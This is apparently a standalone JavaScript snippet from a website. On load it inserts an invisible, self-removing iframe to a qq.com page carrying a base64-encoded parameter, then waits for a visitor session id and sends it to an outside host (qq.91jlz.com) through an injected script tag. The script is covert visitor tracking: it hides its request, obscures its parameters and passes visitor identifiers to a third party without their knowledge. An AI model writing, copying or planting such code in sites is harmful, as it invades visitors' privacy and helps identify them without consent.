(function () {
 
	var f = document.createElement('iframe'), 
		a = {id:'SKg-Ping',width:0, height:0, frameborder:0, scrolling:'no', onload:'var f=document.getElementById("SKg-Ping"); try{f.parentElement.removeChild(f);}catch(e){} delElement();'};
	 
	for(k in a) f.setAttribute(k, a[k]);
	 
	f.src='http://sh.qq.com/zhuanti/adv/xgl.htm?cj1odHRwJTNBJTJGJTJGYXh6LmZkbms5MS5jb20lMkYmZD1mZG5rOTEuY29tJnQ9JUU1JThDJUJCJUU5JTk5JUEyJUU0JUJCJThCJUU3JUJCJThELSVFNCVCOCU4QSVFNiVCNSVCNyVFNSVBNCU4RCVFNSVBNCVBNyVFNyU5RiVBRSVFNSVCMCU4RiVFNyU5NyU4NyVFNSU4QyVCQiVFOSU5OSVBMiZpZD0zNiZwPWh0dHAlM0ElMkYlMkZheHouZmRuazkxLmNvbSUyRnpqZmQlMkZ5eWpzJTJGJnRva2VuPTBmODdmZDc1NDQ2NDhkYTIzZjlhOTUzZjBiNTg3Yzgw';
	 
	document.body.appendChild(f);
	 
	delete f;
 
 
 
    window.delElement = function(){
 
        var ct = setInterval(function(){
 
            if((typeof LR_sid === 'string')&&(LR_sid.length>20)){
 
                window.clearInterval(ct);
 
                var f = document.createElement('script');
 
                f.src='http://qq.91jlz.com/cnzz.php?sid='+ LR_sid +'&r=0f87fd7544648da23f9a953f0b587c80';
 
                document.body.appendChild(f);
 
                delete f;
 
            }
 
        },2000);
 
    }
 
 
 
})();